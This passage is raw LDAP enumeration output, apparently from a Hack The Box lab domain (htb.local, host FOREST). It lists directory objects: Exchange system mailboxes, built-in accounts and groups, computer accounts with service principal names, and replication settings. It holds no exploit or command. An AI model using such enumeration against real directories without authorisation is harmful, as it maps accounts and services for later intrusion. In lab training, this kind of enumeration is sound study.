 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchApprovalApplicationLink: CN=ModeratedRecipients,CN=Approval Applications
 ,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=
 htb,DC=local
msExchApprovalApplicationLink: CN=AutoGroup,CN=Approval Applications,CN=First 
 Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=loc
 al
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAAFAAIAAQEAAAAAAAUKAAAA
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchTransportRecipientSettingsFlags: 0
msExchMessageHygieneSCLRejectThreshold: 7
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 130
msExchMailboxTemplateLink: CN=ArbitrationMailbox,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchMasterAccountSid:: AQEAAAAAAAUKAAAA
msExchMessageHygieneSCLQuarantineThreshold: 9
msExchMailboxGuid:: 5HiVxBNcaEiZERAdAbA1Zw==
msExchMessageHygieneSCLJunkThreshold: 4
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
msExchUMDtmfMap: emailAddress:797836624526922334405312345538937272732720322
msExchUMDtmfMap: lastNameFirstName:7978366245269223344053123455389372727327203
 22
msExchUMDtmfMap: firstNameLastName:7978366245269223344053123455389372727327203
 22
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 6
msExchCapabilityIdentifiers: 66
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 2
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
msExchMessageHygieneSCLDeleteThreshold: 9
msExchRecipientDisplayType: 10
mDBUseDefaults: FALSE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 8388608
mailNickname: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
msExchWhenMailboxCreated: 20190919114801.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}, Users, htb.local
dn: CN=SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9},CN=Users,DC=htb,DC=
 local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
sn: SystemMailbox 8cc370d3-822a-4ab8-a926-bb94bd0641a9
distinguishedName: CN=SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9},CN=U
 sers,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111127.0Z
whenChanged: 20190919114808.0Z
displayName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
uSNCreated: 23820
uSNChanged: 24872
proxyAddresses: SMTP:SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.l
 ocal
name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
objectGUID:: 40l0wLKH/UytuqoyOwty8A==
userAccountControl: 514
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPbAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: SM_1ffab36a2f5f479cb
sAMAccountType: 805306368
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=5219688069384f3ea20b8ad4c26a9dab-Syste
userPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.loc
 al
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z
mail: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.local
msExchVersion: 1126140425011200
mDBOverHardQuotaLimit: 52428800
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAABAAIAAQEAAAAAAAUKAAAA
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchTransportRecipientSettingsFlags: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 134
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
mDBOverQuotaLimit: 52428800
msExchMasterAccountSid:: AQEAAAAAAAUKAAAA
msExchRBACPolicyLink: CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN
 =First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb
 ,DC=local
msExchMailboxGuid:: c7CT+Ckv/U+vK1QaY1W/FA==
msExchDumpsterQuota: 52428800
msExchCalendarLoggingQuota: 6291456
msExchUMDtmfMap: emailAddress:797836624526982237033822242282926229423064129
msExchUMDtmfMap: lastNameFirstName:7978366245269822370338222422829262294230641
 29
msExchUMDtmfMap: firstNameLastName:7978366245269822370338222422829262294230641
 29
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 2
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
mDBUseDefaults: FALSE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 4398046511104
mailNickname: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
msExchWhenMailboxCreated: 20190919114808.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Administrator, Users, htb.local
dn: CN=Administrator,CN=Users,DC=htb,DC=local

# Guest, Users, htb.local
dn: CN=Guest,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=htb,DC=local
uSNChanged: 8197
name: Guest
objectGUID:: 3cHbrmUFAEi25kbTT5W9gA==
userAccountControl: 66082
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNP9QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# DefaultAccount, Users, htb.local
dn: CN=DefaultAccount,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: DefaultAccount
description: A user account managed by the system.
distinguishedName: CN=DefaultAccount,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8198
memberOf: CN=System Managed Accounts Group,CN=Builtin,DC=htb,DC=local
uSNChanged: 8198
name: DefaultAccount
objectGUID:: y2NvxY2HHEaASPoaHAyHpQ==
userAccountControl: 66082
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNP9wEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: DefaultAccount
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# krbtgt, Users, htb.local
dn: CN=krbtgt,CN=Users,DC=htb,DC=local

# Domain Computers, Users, htb.local
dn: CN=Domain Computers,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Domain Computers
description: All workstations and servers joined to the domain
distinguishedName: CN=Domain Computers,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12330
uSNChanged: 12332
name: Domain Computers
objectGUID:: ouVSboyF2E6XJsPHbqQOaw==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPAwIAAA==
sAMAccountName: Domain Computers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Domain Controllers, Users, htb.local
dn: CN=Domain Controllers,CN=Users,DC=htb,DC=local

# Schema Admins, Users, htb.local
dn: CN=Schema Admins,CN=Users,DC=htb,DC=local

# Enterprise Admins, Users, htb.local
dn: CN=Enterprise Admins,CN=Users,DC=htb,DC=local

# Cert Publishers, Users, htb.local
dn: CN=Cert Publishers,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Cert Publishers
description: Members of this group are permitted to publish certificates to th
 e directory
distinguishedName: CN=Cert Publishers,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12342
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
uSNChanged: 12344
name: Cert Publishers
objectGUID:: s9ucbYQ6Ok2Dkp1RfN/Gcg==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPBQIAAA==
sAMAccountName: Cert Publishers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Domain Admins, Users, htb.local
dn: CN=Domain Admins,CN=Users,DC=htb,DC=local

# Domain Users, Users, htb.local
dn: CN=Domain Users,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Domain Users
description: All domain users
distinguishedName: CN=Domain Users,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12348
memberOf: CN=Users,CN=Builtin,DC=htb,DC=local
uSNChanged: 12350
name: Domain Users
objectGUID:: Na/TfFLGD0Cf2TRb9LP8eg==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPAQIAAA==
sAMAccountName: Domain Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Domain Guests, Users, htb.local
dn: CN=Domain Guests,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Domain Guests
description: All domain guests
distinguishedName: CN=Domain Guests,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12351
memberOf: CN=Guests,CN=Builtin,DC=htb,DC=local
uSNChanged: 12353
name: Domain Guests
objectGUID:: mswRDKs9T0mL7UeCdKTzRQ==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPAgIAAA==
sAMAccountName: Domain Guests
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Group Policy Creator Owners, Users, htb.local
dn: CN=Group Policy Creator Owners,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Group Policy Creator Owners
description: Members in this group can modify group policy for the domain
member: CN=Administrator,CN=Users,DC=htb,DC=local
distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12354
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
uSNChanged: 12391
name: Group Policy Creator Owners
objectGUID:: WVPwKNm8xkWJv4Dg3cfD/g==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPCAIAAA==
sAMAccountName: Group Policy Creator Owners
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# RAS and IAS Servers, Users, htb.local
dn: CN=RAS and IAS Servers,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: group
cn: RAS and IAS Servers
description: Servers in this group can access remote access properties of user
 s
distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12357
uSNChanged: 12359
name: RAS and IAS Servers
objectGUID:: XEcpu64kSEGMxmiOGimA5g==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPKQIAAA==
sAMAccountName: RAS and IAS Servers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Computers, htb.local
dn: CN=Computers,DC=htb,DC=local
objectClass: top
objectClass: container
cn: Computers
description: Default container for upgraded computer accounts
distinguishedName: CN=Computers,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225114.0Z
uSNCreated: 5889
uSNChanged: 94358
showInAdvancedViewOnly: FALSE
name: Computers
objectGUID:: DNw3W33UDEapypInhbI17Q==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# EXCH01, Computers, htb.local
dn: CN=EXCH01,CN=Computers,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
cn: EXCH01
distinguishedName: CN=EXCH01,CN=Computers,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918110632.0Z
whenChanged: 20190923225114.0Z
uSNCreated: 12754
memberOf: CN=Exchange Install Domain Servers,CN=Microsoft Exchange System Obje
 cts,DC=htb,DC=local
memberOf: CN=Managed Availability Servers,OU=Microsoft Exchange Security Group
 s,DC=htb,DC=local
memberOf: CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,
 DC=htb,DC=local
memberOf: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=
 local
uSNChanged: 94361
name: EXCH01
objectGUID:: Fbu/ujLgdkO9A28THnz9TA==
userAccountControl: 4096
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 132137531802056348
localPolicyFlags: 0
pwdLastSet: 132132783926408753
primaryGroupID: 515
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPTwQAAA==
accountExpires: 9223372036854775807
logonCount: 161
sAMAccountName: EXCH01$
sAMAccountType: 805306369
operatingSystem: Windows Server 2016 Standard
operatingSystemVersion: 10.0 (14393)
dNSHostName: EXCH01.htb.local
servicePrincipalName: IMAP/EXCH01
servicePrincipalName: IMAP/EXCH01.htb.local
servicePrincipalName: IMAP4/EXCH01
servicePrincipalName: IMAP4/EXCH01.htb.local
servicePrincipalName: POP/EXCH01
servicePrincipalName: POP/EXCH01.htb.local
servicePrincipalName: POP3/EXCH01
servicePrincipalName: POP3/EXCH01.htb.local
servicePrincipalName: exchangeRFR/EXCH01
servicePrincipalName: exchangeRFR/EXCH01.htb.local
servicePrincipalName: exchangeAB/EXCH01
servicePrincipalName: exchangeAB/EXCH01.htb.local
servicePrincipalName: exchangeMDB/EXCH01
servicePrincipalName: exchangeMDB/EXCH01.htb.local
servicePrincipalName: SMTP/EXCH01
servicePrincipalName: SMTP/EXCH01.htb.local
servicePrincipalName: SmtpSvc/EXCH01
servicePrincipalName: SmtpSvc/EXCH01.htb.local
servicePrincipalName: WSMAN/EXCH01
servicePrincipalName: WSMAN/EXCH01.htb.local
servicePrincipalName: RestrictedKrbHost/EXCH01
servicePrincipalName: HOST/EXCH01
servicePrincipalName: RestrictedKrbHost/EXCH01.htb.local
servicePrincipalName: HOST/EXCH01.htb.local
objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: FALSE
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132132783946721257
msDS-SupportedEncryptionTypes: 28
msExchRMSComputerAccountsBL: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa
 1e042,CN=Users,DC=htb,DC=local
msExchCapabilityIdentifiers: 1

# Domain Controllers, htb.local
dn: OU=Domain Controllers,DC=htb,DC=local
objectClass: top
objectClass: organizationalUnit
ou: Domain Controllers
description: Default container for domain controllers
distinguishedName: OU=Domain Controllers,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225114.0Z
uSNCreated: 6031
uSNChanged: 94364
showInAdvancedViewOnly: FALSE
name: Domain Controllers
objectGUID:: ABgTkmY3sku6dDDexltUPw==
systemFlags: -1946157056
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
isCriticalSystemObject: TRUE
gPLink: [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=Syste
 m,DC=htb,DC=local;0]
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# FOREST, Domain Controllers, htb.local
dn: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
cn: FOREST
distinguishedName: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20201229123324.0Z
uSNCreated: 12293
uSNChanged: 278573
name: FOREST
objectGUID:: K0qBC+sYak+USTOHz0Cyeg==
userAccountControl: 532480
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 132537190668014067
localPolicyFlags: 0
pwdLastSet: 132537187923789934
primaryGroupID: 516
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNP6AMAAA==
accountExpires: 9223372036854775807
logonCount: 78
sAMAccountName: FOREST$
sAMAccountType: 805306369
operatingSystem: Windows Server 2016 Standard
operatingSystemVersion: 10.0 (14393)
serverReferenceBL: CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN
 =Configuration,DC=htb,DC=local
dNSHostName: FOREST.htb.local
rIDSetReferences: CN=RID Set,CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
servicePrincipalName: TERMSRV/FOREST
servicePrincipalName: TERMSRV/FOREST.htb.local
servicePrincipalName: exchangeAB/FOREST
servicePrincipalName: exchangeAB/FOREST.htb.local
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/FOREST.htb.loc
 al
servicePrincipalName: ldap/FOREST.htb.local/ForestDnsZones.htb.local
servicePrincipalName: ldap/FOREST.htb.local/DomainDnsZones.htb.local
servicePrincipalName: DNS/FOREST.htb.local
servicePrincipalName: GC/FOREST.htb.local/htb.local
servicePrincipalName: RestrictedKrbHost/FOREST.htb.local
servicePrincipalName: RestrictedKrbHost/FOREST
servicePrincipalName: RPC/236ba33a-7959-4a41-b959-5f82689a0871._msdcs.htb.loca
 l
servicePrincipalName: HOST/FOREST/HTB
servicePrincipalName: HOST/FOREST.htb.local/HTB
servicePrincipalName: HOST/FOREST
servicePrincipalName: HOST/FOREST.htb.local
servicePrincipalName: HOST/FOREST.htb.local/htb.local
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/236ba33a-7959-4a41-
 b959-5f82689a0871/htb.local
servicePrincipalName: ldap/FOREST/HTB
servicePrincipalName: ldap/236ba33a-7959-4a41-b959-5f82689a0871._msdcs.htb.loc
 al
servicePrincipalName: ldap/FOREST.htb.local/HTB
servicePrincipalName: ldap/FOREST
servicePrincipalName: ldap/FOREST.htb.local
servicePrincipalName: ldap/FOREST.htb.local/htb.local
objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132537188041759071
msDS-SupportedEncryptionTypes: 28
msDS-GenerationId:: sVxS/M4Kw6s=
msDFSR-ComputerReferenceBL: CN=FOREST,CN=Topology,CN=Domain System Volume,CN=D
 FSR-GlobalSettings,CN=System,DC=htb,DC=local

# RID Set, FOREST, Domain Controllers, htb.local
dn: CN=RID Set,CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
objectClass: top
objectClass: rIDSet
cn: RID Set
distinguishedName: CN=RID Set,CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105333.0Z
whenChanged: 20201229123324.0Z
uSNCreated: 12470
uSNChanged: 278571
showInAdvancedViewOnly: TRUE
name: RID Set
objectGUID:: tsy/xGk3DUqjd123+pQlFg==
rIDAllocationPool: 36932423786404
rIDPreviousAllocationPool: 36932423786404
rIDUsedPool: 0
rIDNextRID: 8100
objectCategory: CN=RID-Set,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# DFSR-LocalSettings, FOREST, Domain Controllers, htb.local
dn: CN=DFSR-LocalSettings,CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
objectClass: top
objectClass: msDFSR-LocalSettings
cn: DFSR-LocalSettings
distinguishedName: CN=DFSR-LocalSettings,CN=FOREST,OU=Domain Controllers,DC=ht
 b,DC=local
instanceType: 4
whenCreated: 20190918105853.0Z
whenChanged: 20190918110354.0Z
uSNCreated: 12580
uSNChanged: 12747
showInAdvancedViewOnly: TRUE
name: DFSR-LocalSettings
objectGUID:: LPxTMmAeZ0Ct47Owa+mr0Q==
objectCategory: CN=ms-DFSR-LocalSettings,CN=Schema,CN=Configuration,DC=htb,DC=
 local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
msDFSR-Version: 1.0.0.0
msDFSR-Flags: 48

# Domain System Volume, DFSR-LocalSettings, FOREST, Domain Controllers, htb.loc
 al
dn: CN=Domain System Volume,CN=DFSR-LocalSettings,CN=FOREST,OU=Domain Controll
 ers,DC=htb,DC=local
objectClass: top
objectClass: msDFSR-Subscriber
cn: Domain System Volume
distinguishedName: CN=Domain System Volume,CN=DFSR-LocalSettings,CN=FOREST,OU=
 Domain Controllers,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105853.0Z
whenChanged: 20190918105853.0Z
uSNCreated: 12583
uSNChanged: 12583
showInAdvancedViewOnly: TRUE
name: Domain System Volume
objectGUID:: k8l/ncXywUSUyeZgBeyYEw==
objectCategory: CN=ms-DFSR-Subscriber,CN=Schema,CN=Configuration,DC=htb,DC=loc
 al
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
msDFSR-ReplicationGroupGuid:: cAo/grdkV0SiEede3jRcUg==
msDFSR-MemberReference: CN=FOREST,CN=Topology,CN=Domain System Volume,CN=DFSR-
 GlobalSettings,CN=System,DC=htb,DC=local

# SYSVOL Subscription, Domain System Volume, DFSR-LocalSettings, FOREST, Domain
  Controllers, htb.local
dn: CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-LocalSettings,CN=FO
 REST,OU=Domain Controllers,DC=htb,DC=local
objectClass: top
objectClass: msDFSR-Subscription
cn: SYSVOL Subscription
distinguishedName: CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-Loca
 lSettings,CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105853.0Z
whenChanged: 20190918110354.0Z
uSNCreated: 12584
uSNChanged: 12748
showInAdvancedViewOnly: TRUE
name: SYSVOL Subscription
objectGUID:: b2lmUwJHYEmMUaJ2Qz+hng==
objectCategory: CN=ms-DFSR-Subscription,CN=Schema,CN=Configuration,DC=htb,DC=l
 ocal
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
msDFSR-RootPath: C:\Windows\SYSVOL\domain
msDFSR-StagingPath: C:\Windows\SYSVOL\staging areas\htb.local
msDFSR-Enabled: TRUE
msDFSR-Options: 0
msDFSR-ContentSetGuid:: aNkH8z85DkOMOG6IVjHVfw==
msDFSR-ReplicationGroupGuid:: cAo/grdkV0SiEede3jRcUg==
msDFSR-ReadOnly: FALSE

# System, htb.local
dn: CN=System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: System
description: Builtin system settings
distinguishedName: CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225114.0Z
uSNCreated: 5890
uSNChanged: 94382
showInAdvancedViewOnly: TRUE
name: System
objectGUID:: 8q/WZxwc50m7ODR0Zu2QoA==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# WinsockServices, System, htb.local
dn: CN=WinsockServices,CN=System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: WinsockServices
distinguishedName: CN=WinsockServices,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225114.0Z
uSNCreated: 5891
uSNChanged: 94385
showInAdvancedViewOnly: TRUE
name: WinsockServices
objectGUID:: GwYujK4A+kKk/p/ZKxcvCA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
